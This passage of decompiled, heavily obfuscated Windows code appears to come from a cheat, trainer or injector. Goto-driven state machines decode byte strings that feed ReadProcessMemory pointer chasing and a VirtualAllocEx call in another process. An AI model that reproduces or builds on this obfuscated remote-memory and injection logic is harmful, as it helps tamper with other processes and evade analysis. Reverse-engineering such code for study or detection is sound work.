          if (uVar14 == uVar13 + 4) {
            bVar15 = ('\x02' - (cVar10 + 0x2aU & bVar2)) * '\x02' + cVar10 + bVar2;
            uVar14 = uVar14 + uVar13;
            goto LAB_14001064d;
          }
          if (uVar14 == uVar13 + 100) {
            bVar15 = (bVar2 + cVar10 + (cVar10 + 8U & bVar2) * -2) - 0x30;
            goto LAB_14001064d;
          }
          if (uVar14 == uVar13 + 0x200) {
            bVar15 = bVar2 + cVar10 + (cVar10 - 0x1aU & bVar2) * -2 + 0x9c;
            goto LAB_140010551;
          }
          if (uVar14 == uVar13 + 3) {
            bVar15 = ('4' - (cVar10 - 0x3cU & bVar2)) * '\x02' + cVar10 + bVar2;
            goto LAB_14001057a;
          }
          if (uVar14 == uVar13 + 0x42) {
            bVar15 = ('\x1a' - (cVar10 + 0xa2U & bVar2)) * '\x02' + cVar10 + bVar2;
            uVar11 = uVar11 + *(byte *)((longlong)local_148 + (uVar11 - 0x30)) + uVar13 + 1;
            goto LAB_14000fd53;
          }
          uVar7 = uVar13;
        } while (uVar14 == uVar13 + 0x80);
        uVar14 = uVar13 + 10;
        uVar7 = uVar13 + 0xc;
        if (uVar14 < uVar13 + 0x100c) {
          bVar15 = ('\x19' - (cVar10 + 0x4dU & bVar2)) * '\x02' + cVar10 + bVar2;
          goto LAB_14000fd40;
        }
        if (uVar14 < uVar13 + 0x12) {
          bVar15 = (bVar2 + cVar10 + (cVar10 + 0x2bU & bVar2) * -2) - 2;
          goto LAB_14000fd50;
        }
        if (uVar14 < uVar13 + 0x15) {
          bVar15 = cVar10 + (cVar10 + 9U & bVar2) * -2 + -0x36 + bVar2;
          uVar13 = uVar7;
          goto LAB_14000fd70;
        }
        if (uVar14 < uVar13 + 0x40c) {
          bVar15 = cVar10 + (cVar10 - 0x19U & bVar2) * -2 + -0x6a + bVar2;
          uVar13 = uVar7;
          goto LAB_14000fdc0;
        }
        if (uVar14 < uVar13 + 0x11) break;
        if (uVar14 < uVar13 + 0x8c) {
          bVar15 = cVar10 + 0xa3;
          cVar16 = '\x17';
          uVar13 = uVar7;
          goto LAB_1400101e9;
        }
        if (uVar14 < uVar13 + 0x3f4) {
          cVar16 = cVar10 + (cVar10 + 0x81U & bVar2) * -2 + -6;
          uVar13 = uVar7;
          goto LAB_1400101af;
        }
        if (uVar14 < uVar13 + 0x10) {
          cVar16 = cVar10 + (cVar10 + 0x5fU & bVar2) * -2 + -0x3a;
          uVar13 = uVar7;
          goto LAB_140010176;
        }
        if (uVar14 < uVar13 + 0x70) {
          bVar15 = bVar2 + cVar10 + (cVar10 + 0x3dU & bVar2) * -2 + 0x92;
          uVar13 = uVar7;
          goto LAB_140010153;
        }
        if (uVar13 + 0x20c <= uVar14) {
          uVar14 = uVar13 + 0x1c;
          uVar7 = uVar13 + 0x1f;
          if (uVar13 + 0x80 < uVar14) {
            bVar15 = bVar2 + cVar10 + (cVar10 - 0x18U & bVar2) * -2 + 0x90;
            uVar11 = uVar11 + *(byte *)((longlong)local_148 + (uVar11 - 0x30)) + uVar7 + 1;
            uVar13 = uVar7;
            goto LAB_14000fd53;
          }
          if (uVar13 + 0x27 < uVar14) {
            bVar15 = ('.' - (cVar10 - 0x3aU & bVar2)) * '\x02' + cVar10 + bVar2;
            uVar13 = uVar7;
            goto LAB_14001057a;
          }
          if (uVar13 + 0x29 < uVar14) {
            bVar15 = ('\x14' - (cVar10 + 0xa4U & bVar2)) * '\x02' + cVar10 + bVar2;
            uVar13 = uVar7;
            goto LAB_140010551;
          }
          if (uVar13 + 0x101f < uVar14) {
            bVar15 = (bVar2 + cVar10 + (cVar10 + 0x82U & bVar2) * -2) - 0xc;
            uVar13 = uVar7;
            goto LAB_14001064d;
          }
          if (uVar13 + 0x25 < uVar14) {
            bVar15 = (bVar2 + cVar10 + (cVar10 + 0x60U & bVar2) * -2) - 0x40;
            uVar14 = uVar14 + uVar7;
            uVar13 = uVar7;
            goto LAB_14001064d;
          }
          if (uVar13 + 0x21f < uVar14) {
            bVar15 = bVar2 + cVar10 + (cVar10 + 0x3eU & bVar2) * -2 + 0x8c;
            uVar13 = uVar7;
            goto LAB_140010501;
          }
          if (uVar13 + 0x41f < uVar14) {
            bVar15 = (',' - (cVar10 + 0x1cU & bVar2)) * '\x02' + cVar10 + bVar2;
            uVar13 = uVar7;
            goto LAB_14000fd53;
          }
          if (uVar13 + 0x24 < uVar14) {
            bVar15 = ('\x12' - (cVar10 - 6U & bVar2)) * '\x02' + cVar10 + bVar2;
            uVar13 = uVar13 + 0x20;
            goto LAB_14000fd53;
          }
          if (uVar13 + 0x9f < uVar14) {
            bVar15 = (bVar2 + cVar10 + (cVar10 - 0x28U & bVar2) * -2) - 0x10;
            uVar13 = uVar7;
            goto LAB_1400105f1;
          }
          if (uVar14 <= uVar13 + 0x407) {
            uVar14 = uVar13 + 0x3f;
            uVar7 = uVar13 + 0x43;
          }
        }
      }
      bVar15 = ('1' - (cVar10 - 0x3bU & bVar2)) * '\x02' + cVar10 + bVar2;
      uVar13 = uVar7;
    }
    if (uVar14 < uVar13 + 0x200) {
      bVar15 = cVar10 - 0x11;
      cVar16 = '3';
LAB_1400101e9:
      bVar15 = (cVar16 - (bVar15 & bVar2)) * '\x02' + cVar10 + bVar2;
LAB_1400101f5:
      if (uVar13 + uVar14 != 8) {
        if (uVar13 + 0x2a < uVar14) {
          cVar16 = ('\'' - (cVar10 - 0xdU & bVar2)) * '\x02' + cVar10;
LAB_1400101af:
          bVar15 = cVar16 + bVar2;
LAB_1400101b2:
          if (uVar14 < 9) {
            if (uVar13 + 1 < uVar14) {
              cVar16 = cVar10 + (cVar10 + 0x8eU & bVar2) * -2 + -0x54;
LAB_140010176:
              bVar15 = cVar16 + bVar2;
            }
            else {
              if (uVar14 == uVar13 + 1) {
                bVar15 = ('<' - (cVar10 + 0x6cU & bVar2)) * '\x02' + cVar10 + bVar2;
                uVar11 = uVar11 + *(byte *)((longlong)local_148 + (uVar11 - 0x30)) + uVar13 + 1;
                goto LAB_14000fd53;
              }
              if (uVar14 == uVar13 + 3) {
                bVar15 = bVar2 + cVar10 + (cVar10 - 0x1cU & bVar2) * -2 + 0xa8;
                uVar14 = uVar14 + uVar13;
                goto LAB_14001064d;
              }
              if (uVar14 == uVar13 + 2) {
                bVar15 = ('\x06' - (cVar10 + 0x7eU & bVar2)) * '\x02' + cVar10 + bVar2;
                uVar13 = uVar13 + 1;
                goto LAB_14000fd53;
              }
            }
            if (9 < uVar13) {
              bVar15 = (('\x12' - (cVar10 + 0x3aU & bVar2)) * '\x02' + cVar10 + bVar2) * '\x02';
              goto LAB_1400105f1;
            }
LAB_140010153:
            *(byte *)((longlong)local_148 + (uVar11 - 0x30)) = bVar15;
            uVar11 = uVar11 + 1;
            goto LAB_14000fd53;
          }
          bVar15 = ((bVar2 - (cVar10 + 0x18U & bVar2)) + '8') * '\x02' + cVar10;
LAB_140010501:
          *(byte *)((longlong)local_148 + (uVar11 - 0x30)) =
               bVar2 + (bVar2 & cVar10 + 7U) * -2 + -0x31 + cVar10 + 7U + bVar15;
          uVar14 = uVar14 + uVar13;
        }
        else {
          if (uVar14 == uVar13 + 1) {
            bVar15 = cVar10 - 0x2f;
            cVar16 = '\r';
            goto LAB_1400105e2;
          }
          if (uVar14 == uVar13 + 3) {
            bVar15 = ('%' - (cVar10 + 0x49U & bVar2)) * '\x02' + cVar10 + bVar2;
            uVar14 = uVar14 + uVar13;
          }
          else {
            if (uVar14 != uVar13 + 6) {
              if (uVar14 == uVar13 + 4) {
                bVar15 = (bVar2 + cVar10 + (cVar10 + 5U & bVar2) * -2) - 0x1e;
                goto LAB_140010551;
              }
              goto LAB_1400101b2;
            }
            bVar15 = ('\v' - (cVar10 + 0x27U & bVar2)) * '\x02' + cVar10 + bVar2;
          }
        }
LAB_14001064d:
        uVar11 = uVar11 - bVar15;
        goto LAB_14000fd53;
      }
      bVar15 = ('\x1e' - (cVar10 - 10U & bVar2)) * '\x02' + cVar10;
    }
    else {
      if (uVar14 == uVar13 + 1) {
        bVar15 = bVar2 + cVar10 + (cVar10 + 0x36U & bVar2) * -2 + 0xbc;
        uVar11 = uVar11 + *(byte *)((longlong)local_148 + (uVar11 - 0x30)) + uVar13 + 1;
        goto LAB_14000fd53;
      }
      if (uVar14 != uVar13 + 3) {
        if (uVar14 == uVar13 + 2) {
          bVar15 = (bVar2 + cVar10 + (cVar10 + 0xaeU & bVar2) * -2) - 0x14;
          uVar14 = uVar14 + uVar13;
          goto LAB_14001064d;
        }
        if (uVar14 != uVar13 + 8) goto LAB_1400101f5;
        bVar15 = cVar10 + 0x26;
        cVar16 = '\x0e';
LAB_1400105e2:
        bVar15 = (cVar16 - (bVar15 & bVar2)) * '\x02' + cVar10 + bVar2;
LAB_1400105f1:
        *(byte *)((longlong)local_148 + (uVar11 - 0x30)) =
             bVar2 + (bVar2 & cVar10 + 0x29U) * -2 + -0x1f + cVar10 + 0x29U;
        uVar13 = uVar13 + 1;
        goto LAB_14000fd53;
      }
      bVar15 = ('*' - (cVar10 - 0xeU & bVar2)) * '\x02' + cVar10 + bVar2;
    }
LAB_140010551:
    bVar5 = bVar2 + (bVar2 & cVar10 - 0x1bU) * -2 + -0x43 + (cVar10 - 0x1bU);
    *(byte *)((longlong)local_148 + (uVar11 - 0x30)) = bVar5;
    uVar11 = uVar11 - ((ulonglong)bVar5 + uVar13 + 1);
    uVar13 = uVar13 + 1;
LAB_14001057a:
    bVar5 = (char)uVar11 - 0x2c;
    *(byte *)((longlong)local_148 + (uVar11 - 0x30)) =
         ('\x1a' - (bVar2 & bVar5)) * '\x02' + bVar2 + bVar5;
    uVar14 = uVar14 + 1;
    lVar12 = uVar11 + (-1 - uVar14);
    uVar11 = lVar12 + *(byte *)((longlong)local_148 + lVar12 + -0x30) + uVar13 + 1;
    goto LAB_14000fd53;
  }
  puVar8 = &local_178;
LAB_1400106de:
  FUN_140023550(local_300,puVar8);
  FUN_14000fa30(local_148[0],local_b0,local_300,0);
  FUN_140025000(local_300);
  if (local_80 == '\0') {
    uVar9 = 0;
LAB_1400174b3:
    FUN_14000fbd0(local_b0);
    return uVar9;
  }
  local_118 = local_148;
  local_110 = 0;
  ReadProcessMemory(hProcess,(LPCVOID)(local_90 + _DAT_140a61938),&local_110,8,(SIZE_T *)0x0);
  local_108 = 0;
  ReadProcessMemory(hProcess,(LPCVOID)(local_110 + _DAT_140a61958),&local_108,8,(SIZE_T *)0x0);
  lpBaseAddress = (LPCVOID)FUN_1400174f0(&local_118,local_108);
  local_100 = 0;
  ReadProcessMemory(hProcess,lpBaseAddress,&local_100,8,(SIZE_T *)0x0);
  lVar12 = local_100;
  local_f8 = 0;
  ReadProcessMemory(hProcess,(LPCVOID)(local_100 + 8),&local_f8,8,(SIZE_T *)0x0);
  uVar9 = local_f8;
  local_2d8 = 0xb3b4b58a;
  local_2d4 = 0;
  uStack_2cc = 0;
  local_2c4 = 0;
  local_2c2 = 0;
  bVar15 = local_120[0];
LAB_140010821:
  uVar13 = 0;
  uVar7 = DAT_140a618c8;
  uVar14 = DAT_140a618d0;
LAB_140010830:
  if (uVar13 < 0x17) {
    bVar2 = local_300[uVar13 + 0x28];
    cVar10 = (char)uVar13;
    while (uVar7 <= uVar13) {
      if (uVar14 + 1 <= uVar7) {
        if (uVar7 == uVar14 + 1) {
          bVar15 = (cVar10 + 0xbbU + bVar2 + (bVar2 & cVar10 + 0xbbU) * -2) - 0x1d;
          uVar13 = uVar13 + (byte)local_300[uVar13 + 0x28] + uVar14 + 1;
        }
        else {
          if (uVar7 == uVar14 + 2) {
            bVar15 = bVar2 + cVar10 + 0x8dU + (cVar10 + 0x8dU & bVar2) * -2 + 0x25;
          }
          else {
            if (uVar7 != uVar14 + 2) {
              if (uVar7 == uVar14 + 5) {
                bVar15 = bVar2 + (cVar10 - 0x2bU) + (cVar10 - 0x2bU & bVar2) * -2 + 0x2d;
LAB_140010f7d:
                local_300[uVar13 + 0x28] =
                     cVar10 + 0x91U + (cVar10 + 0x91U & bVar2) * -2 + '\t' + bVar15 + bVar2;
LAB_140010f99:
                uVar7 = uVar7 + uVar14;
                goto LAB_140010f9c;
              }
              if (uVar7 != uVar14 + 3) {
                if (uVar7 != uVar14 + 8) goto LAB_1400108c4;
                bVar15 = ('\x1f' - (cVar10 + 0x4bU & bVar2)) * '\x02' + bVar2 + cVar10;
                goto LAB_140010f1d;
              }
              bVar15 = ('\v' - (cVar10 + 0xa7U & bVar2)) * '\x02' + bVar2 + cVar10;
              goto LAB_140010830;
            }
            bVar15 = bVar2 + cVar10 + 0x5fU + (cVar10 + 0x5fU & bVar2) * -2 + 0x67;
LAB_140010fcb:
            bVar5 = cVar10 + 99U + (cVar10 + 99U & bVar2) * -2 + 'K' + bVar2;
            local_300[uVar13 + 0x28] = bVar5;
            uVar14 = uVar14 + 1;
            uVar13 = uVar13 - (bVar5 + uVar14);
          }
LAB_14001100a:
          bVar5 = (char)uVar13 + 0x4c;
          local_300[uVar13 + 0x28] = bVar2 + (bVar2 & bVar5) * -2 + -0x14 + bVar5;
          lVar18 = uVar13 + (-1 - (uVar7 + 1));
          uVar13 = lVar18 + (byte)local_300[lVar18 + 0x28] + uVar14 + 1;
          uVar7 = uVar7 + 1;
        }
        goto LAB_140010830;
      }
      bVar15 = (cVar10 - 0x17U) + (cVar10 - 0x17U & bVar2) * -2 + -0x5f + bVar2;
LAB_1400108c4:
      if (uVar13 < uVar14) {
        in_stack_0044ae9d = in_stack_0171c9b4;
        break;
      }
      if (uVar14 + 3 <= uVar7) {
        if (uVar7 == uVar14 + 1) {
          bVar15 = ('3' - (cVar10 - 0x11U & bVar2)) * '\x02' + cVar10 + bVar2;
LAB_140010f1d:
          local_300[uVar13 + 0x28] = cVar10 + 0xbfU + (cVar10 + 0xbfU & bVar2) * -2 + -0x39 + bVar2;
          uVar14 = uVar14 + 1;
        }
        else if (uVar7 == uVar14 + 2) {
          bVar15 = ('=' - (cVar10 - 0x3fU & bVar2)) * '\x02' + cVar10 + bVar2;
          uVar14 = uVar14 + 1;
        }
        else if (uVar7 == uVar14 + 2) {
          bVar15 = bVar2 + cVar10 + (cVar10 + 0x93U & bVar2) * -2 + 0x8e;
        }
        else {
          if (uVar7 == uVar14 + 7) {
            bVar15 = (bVar2 + cVar10 + (cVar10 - 0x25U & bVar2) * -2) - 0x22;
            goto LAB_140010fcb;
          }
          if (uVar7 != uVar14 + 6) goto LAB_140010941;
          bVar15 = ('\x03' - (cVar10 + 0x7fU & bVar2)) * '\x02' + cVar10 + bVar2;
          uVar13 = uVar13 + (byte)local_300[uVar13 + 0x28] + uVar14 + 1;
        }
        goto LAB_140010830;
      }
      bVar15 = (')' - (cVar10 + 0x1dU & bVar2)) * '\x02' + cVar10 + bVar2;
LAB_140010941:
      if (uVar7 + uVar14 <= uVar13) {
        if (uVar14 + 5 <= uVar7) {
          if (uVar7 == uVar14 + 1) {
            bVar15 = bVar2 + cVar10 + (cVar10 + 0x3aU & bVar2) * -2 + 0xa4;
            uVar13 = uVar13 + (byte)local_300[uVar13 + 0x28] + uVar14 + 1;
          }
          else {
            if (uVar7 == uVar14 + 2) {
              bVar15 = bVar2 + cVar10 + (cVar10 + 0xcU & bVar2) * -2 + 0xb8;
              goto LAB_14001100a;
            }
            if (uVar7 != uVar14 + 3) {
              if (uVar7 != uVar14 + 2) {
                if (uVar7 == uVar14 + 6) {
                  bVar15 = ('\x04' - (cVar10 + 0x54U & bVar2)) * '\x02' + cVar10 + bVar2;
                  goto LAB_140010f7d;
                }
                if (uVar7 == uVar14 + 9) {
                  bVar15 = ('\"' - (cVar10 - 0x36U & bVar2)) * '\x02' + cVar10 + bVar2;
                  goto LAB_140010f1d;
                }
                goto LAB_140010ae8;
              }
              bVar15 = (bVar2 + cVar10 + (cVar10 + 0x82U & bVar2) * -2) - 0xc;
              goto LAB_140010f99;
            }
            bVar15 = (bVar2 + cVar10 + (cVar10 + 0xb0U & bVar2) * -2) - 0x20;
LAB_140010f9c:
            uVar13 = uVar13 - bVar15;
          }
          goto LAB_140010830;
        }
        bVar15 = cVar10 + (cVar10 - 0x17U & bVar2) * -2 + -0x76 + bVar2;
LAB_140010ae8:
        if (uVar7 + uVar14 == 8) {
          bVar15 = ('\x12' - (cVar10 + 0x7aU & bVar2)) * '\x02' + cVar10;
          goto LAB_140010fcb;
        }
        if (uVar14 + 8 < uVar7) {
          bVar15 = cVar10 + (cVar10 + 0x85U & bVar2) * -2 + -0x1e + bVar2;
        }
        else {
          if (uVar7 == uVar14 + 1) {
            bVar15 = (bVar2 + cVar10 + (cVar10 + 0x57U & bVar2) * -2) - 10;
            goto LAB_140010f1d;
          }
          if (uVar7 == uVar14 + 3) {
            bVar15 = ('\x0f' - (cVar10 - 5U & bVar2)) * '\x02' + cVar10 + bVar2;
            goto LAB_140010830;
          }
          if (uVar7 == uVar14 + 2) {
            bVar15 = bVar2 + cVar10 + (cVar10 - 0x19U & bVar2) * -2 + 0x96;
            uVar13 = uVar13 + (byte)local_300[uVar13 + 0x28] + uVar14 + 1;
            goto LAB_140010830;
          }
        }
        if (9 < uVar7) {
          bVar15 = ((bVar2 - (cVar10 + 0xa8U & bVar2)) + '\b') * '\x02' + cVar10;
          goto LAB_140010f7d;
        }
        if (uVar14 + 10 < uVar7) {
          bVar15 = ('\x1a' - (cVar10 + 0xa2U & bVar2)) * '\x02' + cVar10 + bVar2;
        }
        else {
          if (uVar7 == uVar14 + 1) {
            bVar15 = ('$' - (cVar10 + 0x74U & bVar2)) * '\x02' + cVar10 + bVar2;
            uVar13 = uVar13 + (byte)local_300[uVar13 + 0x28] + uVar14 + 1;
            goto LAB_140010830;
          }
          if (uVar7 == uVar14 + 2) {
            bVar15 = ('8' - (cVar10 + 0x18U & bVar2)) * '\x02' + cVar10 + bVar2;
            goto LAB_140010fcb;
          }
          if (uVar7 == uVar14 + 3) {
            bVar15 = bVar2 + cVar10 + (cVar10 - 0x16U & bVar2) * -2 + 0x84;
            goto LAB_140010f9c;
          }
          if (uVar7 == uVar14 + 5) {
            bVar15 = (bVar2 + cVar10 + (cVar10 + 0x60U & bVar2) * -2) - 0x40;
            goto LAB_140010830;
          }
          if (uVar7 == uVar14 + 6) {
            bVar15 = (bVar2 + cVar10 + (cVar10 + 4U & bVar2) * -2) - 0x18;
            goto LAB_140010f1d;
          }
        }
        if (0x1f < uVar14) {
          bVar15 = (cVar10 + (cVar10 - 0x2aU & bVar2) * -2 + bVar2) * '\x02' - 8;
          goto LAB_140010f1d;
        }
LAB_140010ac3:
        local_300[uVar13 + 0x28] = bVar15;
        uVar13 = uVar13 + 1;
        goto LAB_140010830;
      }
      uVar11 = uVar14;
      while( true ) {
        do {
          uVar14 = uVar11;
          if (uVar7 == uVar11 + 4) {
            bVar15 = ('&' - (cVar10 + 0x1eU & bVar2)) * '\x02' + cVar10 + bVar2;
            goto LAB_140010f1d;
          }
          if (uVar7 == uVar11 + 0x40) {
            bVar15 = bVar2 + cVar10 + (cVar10 + 0x94U & bVar2) * -2 + 0x88;
            goto LAB_140010f7d;
          }
          if (uVar7 == uVar11 + 0x7a) {
            bVar15 = (bVar2 + cVar10 + (cVar10 + 10U & bVar2) * -2) - 0x3c;
            goto LAB_140010fcb;
          }
          uVar17 = uVar11 + 6;
        } while (uVar7 == uVar17);
        uVar14 = uVar11 + 0xc;
        if (uVar17 < uVar11 + 0x12) {
          bVar15 = bVar2 + cVar10 + (cVar10 + 0x3bU & bVar2) * -2 + 0x9e;
          goto LAB_140010821;
        }
        uVar7 = uVar17;
        if (uVar17 < uVar11 + 0x70) break;
        if (uVar17 < uVar11 + 0x66) {
          bVar15 = ('\x01' - (cVar10 + 0x55U & bVar2)) * '\x02' + cVar10 + bVar2;
          goto LAB_140010ae8;
        }
        uVar1 = uVar11 + 0x15;
        if (uVar17 < uVar1) {
          bVar15 = ('\x1f' - (cVar10 - 0x35U & bVar2)) * '\x02' + cVar10 + bVar2;
          goto LAB_140010ac3;
        }
        uVar14 = uVar11 + 0x1e;
        uVar7 = uVar1;
        if (uVar11 + 0x27 < uVar1) {
          bVar15 = (bVar2 + cVar10 + (cVar10 + 0x58U & bVar2) * -2) - 0x10;
          uVar13 = uVar13 + (byte)local_300[uVar13 + 0x28] + uVar14 + 1;
          goto LAB_140010830;
        }
        if (uVar11 + 0x21e < uVar1) {
          bVar15 = ('\x02' - (cVar10 + 0x2aU & bVar2)) * '\x02' + cVar10 + bVar2;
          goto LAB_14001100a;
        }
        if (uVar11 + 0x1f < uVar1) {
          bVar15 = (' ' - (cVar10 + 0xa0U & bVar2)) * '\x02' + cVar10 + bVar2;
          goto LAB_140010f99;
        }
        uVar7 = uVar11 + 0x2e;
        if (uVar7 < uVar1) {
          bVar15 = ('>' - (cVar10 + 0x16U & bVar2)) * '\x02' + cVar10 + bVar2;
          uVar14 = uVar11 + 0x1f;
          uVar7 = uVar1;
          goto LAB_140010830;
        }
        uVar11 = uVar11 + 0x42e;
      }
      bVar15 = cVar10 + (cVar10 - 0x21U & bVar2) * -2 + -0x3a + bVar2;
    }
  }
  else {
    in_stack_0044ae9d = local_2d8;
  }
  local_2b8 = 0x4b548556;
  local_2b4 = 0;
  uStack_2ac = 0;
  local_2a4 = 0;
  local_2a2 = 0;
  bVar15 = local_120[0];
LAB_1400110d0:
  uVar14 = DAT_140a618c8;
  uVar7 = DAT_140a618d0;
LAB_1400110e0:
  uVar11 = 0;
  uVar13 = uVar7;
LAB_1400110e3:
  if (0x16 < uVar11) {
    in_stack_01731511 = local_2b8;
LAB_140011c3b:
    lpAddress = VirtualAllocEx(*(HANDLE *)(*(longlong *)(local_148[0] + 0x58) + 0x30),(LPVOID)0x0,
                               0x300,in_stack_01731511,in_stack_0044ae9d);
    uVar14 = 0;
    bVar15 = local_120[0];
LAB_140011c68:
    local_298 = -0x747b7f7a;
    local_294 = 0;
    uStack_28c = 0;
    local_284 = 0;
    local_280 = 0;
    local_27e = 0;
LAB_140011c82:
    uVar7 = DAT_140a618c8;
    uVar13 = DAT_140a618d0;
LAB_140011c90:
    uVar17 = 0;
    uVar11 = uVar13;
LAB_140011c93:
    if (uVar17 < 0x1b) {
      bVar2 = *(byte *)((longlong)&local_298 + uVar17);
      bVar5 = (byte)uVar17;
LAB_140011cb1:
      if (uVar17 < uVar7) {
        iVar4 = in_stack_00988c99;
        goto LAB_140012690;
      }
      if (uVar11 + 1 <= uVar7) {
        if (uVar7 != uVar11 + 1) {
          if (uVar7 != uVar11 + 3) goto LAB_140011cf3;
          bVar6 = bVar5 + 0x11;
          cVar10 = bVar2 + (bVar2 & bVar6) * -2 + -0x77;
          goto LAB_1400125e6;
        }
        bVar15 = bVar5 + 0x3f + bVar2 + (bVar2 & bVar5 + 0x3f) * -2 + 0x47;
        uVar17 = uVar17 + *(byte *)((longlong)&local_298 + uVar17) + uVar11 + 1;
        goto LAB_140011c93;
      }
      bVar15 = bVar5 + 0x15 + (bVar5 + 0x15 & bVar2) * -2 + 'm' + bVar2;
LAB_140011cf3:
      if (uVar17 < uVar11) {
        iVar4 = in_stack_016ae784;
        goto LAB_140012690;
      }
      bVar6 = bVar5;
      if (uVar11 + 8 <= uVar7) {
        if (uVar7 == uVar11 + 1) {
          cVar10 = bVar2 + (bVar5 - 0x1d & bVar2) * -2 + -0x52;
          goto LAB_1400125a4;
        }
        if (uVar7 != uVar11 + 2) {
          if (uVar7 != uVar11 + 4) {
            if (uVar7 != uVar11 + 3) goto LAB_140011d50;
            bVar15 = bVar5 + bVar2 + (bVar5 + 0x8b & bVar2) * -2 + 0xbe;
            goto LAB_140012607;
          }
          cVar10 = bVar2 + (bVar5 + 0x61 & bVar2) * -2 + -0x46;
          goto LAB_1400125e6;
        }
        bVar15 = bVar5 + bVar2 + (bVar5 + 0xd & bVar2) * -2 + 0xb2;
        uVar11 = uVar11 + 1;
        goto LAB_140011c93;
      }
      bVar15 = bVar2 + (bVar5 + 0xb9 & bVar2) * -2 + -0x56 + bVar5;
LAB_140011d50:
      while (uVar13 = uVar11, uVar17 < uVar11 + uVar7) {
        while( true ) {
          do {
            uVar11 = uVar13;
            if (uVar7 == uVar11 + 0x80) {
              cVar10 = bVar2 + (bVar5 + 6 & bVar2) * -2 + -0x24;
              goto LAB_1400125a4;
            }
            if (uVar7 == uVar11 + 100) {
              bVar15 = (bVar5 + bVar2 + (bVar5 + 0x30 & bVar2) * -2) - 0x20;
              uVar11 = uVar11 + 1;
              goto LAB_140011c93;
            }
            if (uVar7 == uVar11 + 0x42) {
              bVar15 = (bVar5 + bVar2 + (bVar5 + 0x5a & bVar2) * -2) - 0x1c;
              goto LAB_140011c93;
            }
            if (uVar7 == uVar11 + 0x40) {
              cVar10 = bVar2 + (bVar5 + 0x84 & bVar2) * -2 + -0x18;
              goto LAB_1400125e6;
            }
            if (uVar7 == uVar11 + 3) {
              bVar15 = (bVar5 + bVar2 + (bVar5 + 0xae & bVar2) * -2) - 0x14;
              goto LAB_140012607;
            }
            if (uVar7 == uVar11 + 2) {
              bVar15 = (bVar5 + bVar2 + (bVar5 - 0x28 & bVar2) * -2) - 0x10;
              goto LAB_14001260a;
            }
            if (uVar7 == uVar11 + 1) {
              bVar15 = bVar2 + (bVar5 + 2 & bVar2) * -2 + -0xc + bVar5;
              goto LAB_1400124de;
            }
            if (uVar7 == uVar11 + 0x2a) {
              bVar15 = bVar2 + (bVar5 + 0x2c & bVar2) * -2 + -8 + bVar5;
              goto LAB_140012506;
            }
            if (uVar7 == uVar11 + 0x5a) {
              bVar15 = (bVar5 + bVar2 + (bVar5 + 0x56 & bVar2) * -2) - 4;
              uVar17 = uVar17 + *(byte *)((longlong)&local_298 + uVar17) + uVar11 + 1;
              goto LAB_140011c93;
            }
            uVar13 = uVar11;
          } while (uVar7 == uVar11 + 0x41);
          uVar7 = uVar11 + 0x10;
          uVar13 = uVar11 + 0x8a;
          if (uVar7 < uVar11 + 0x94) {
            bVar15 = bVar5 + bVar2 + (bVar5 + 0xbf & bVar2) * -2 + 0x86;
            goto LAB_140011c82;
          }
          if (uVar7 < uVar11 + 0x93) {
            bVar15 = bVar5 + bVar2 + (bVar5 - 0x17 & bVar2) * -2 + 0x8a;
            goto LAB_140011c90;
          }
          if (uVar7 < uVar11 + 0x92) {
            bVar15 = bVar2 + (bVar5 + 0x13 & bVar2) * -2 + -0x72 + bVar5;
            uVar11 = uVar13;
            goto LAB_140011cb1;
          }
          if (uVar7 < uVar11 + 0x90) {
            bVar15 = bVar2 + (bVar5 + 0x3d & bVar2) * -2 + -0x6e + bVar5;
            uVar11 = uVar13;
            goto LAB_140011cf3;
          }
          if (uVar7 < uVar11 + 0x8f) break;
          if (uVar7 < uVar11 + 0x8e) {
            cVar10 = bVar2 + (bVar5 + 0x91 & bVar2) * -2 + -0x66;
            uVar11 = uVar13;
            goto LAB_14001211c;
          }
          if (uVar7 < uVar11 + 0x8d) {
            cVar10 = bVar2 + (bVar5 + 0xbb & bVar2) * -2 + -0x62;
            uVar11 = uVar13;
            goto LAB_1400120d7;
          }
          if (uVar7 < uVar11 + 0x8c) {
            cVar10 = bVar2 + (bVar5 - 0x1b & bVar2) * -2 + -0x5e;
            uVar11 = uVar13;
            goto LAB_14001209b;
          }
          if (uVar7 < uVar11 + 0x8b) {
            bVar15 = bVar5 + bVar2 + (bVar5 + 0xf & bVar2) * -2 + 0xa6;
            uVar11 = uVar13;
            goto LAB_14001207b;
          }
          if (uVar11 + 0xb4 <= uVar7) {
            uVar7 = uVar11 + 0xb2;
            uVar13 = uVar11 + 0x10c;
            if (uVar11 + 300 < uVar7) {
              bVar15 = ('\x18' - (bVar5 + 0x78 & bVar2)) * '\x02' + bVar2 + bVar5;
              uVar17 = uVar17 + *(byte *)((longlong)&local_298 + uVar17) + uVar13 + 1;
              uVar11 = uVar13;
              goto LAB_140011c93;
            }
            if (uVar11 + 0x11c < uVar7) {
              bVar15 = ('\x1a' - (bVar5 + 0xa2 & bVar2)) * '\x02' + bVar2 + bVar5;
              uVar11 = uVar13;
              goto LAB_140012506;
            }
            if (uVar11 + 0x116 < uVar7) {
              bVar15 = ('\x1c' - (bVar5 - 0x34 & bVar2)) * '\x02' + bVar2 + bVar5;
              uVar11 = uVar13;
              goto LAB_1400124de;
            }
            if (uVar11 + 0x115 < uVar7) {
              bVar15 = ('\x1e' - (bVar5 - 10 & bVar2)) * '\x02' + bVar2 + bVar5;
              uVar11 = uVar13;
              goto LAB_14001260a;
            }
            if (uVar11 + 0x114 < uVar7) {
              bVar15 = (' ' - (bVar5 + 0x20 & bVar2)) * '\x02' + bVar2 + bVar5;
              uVar11 = uVar13;
              goto LAB_140012607;
            }
            if (uVar11 + 0x112 < uVar7) {
              cVar10 = ('\"' - (bVar5 + 0x4a & bVar2)) * '\x02' + bVar2;
              uVar11 = uVar13;
              goto LAB_1400125e6;
            }
            if (uVar11 + 0x111 < uVar7) {
              bVar15 = ('$' - (bVar5 + 0x74 & bVar2)) * '\x02' + bVar2 + bVar5;
              uVar11 = uVar13;
              goto LAB_140011c93;
            }
            if (uVar11 + 0x110 < uVar7) {
              bVar15 = ('&' - (bVar5 + 0x9e & bVar2)) * '\x02' + bVar2 + bVar5;
              uVar11 = uVar11 + 0x10d;
              goto LAB_140011c93;
            }
            if (uVar11 + 0x10f < uVar7) {
              cVar10 = ('(' - (bVar5 - 0x38 & bVar2)) * '\x02' + bVar2;
              uVar11 = uVar13;
              goto LAB_1400125a4;
            }
            if (uVar7 <= uVar11 + 0x10e) {
              uVar7 = uVar11 + 0x14e;
              uVar13 = uVar11 + 0x14f;
            }
          }
        }
        bVar15 = bVar2 + (bVar5 + 0x67 & bVar2) * -2 + -0x6a + bVar5;
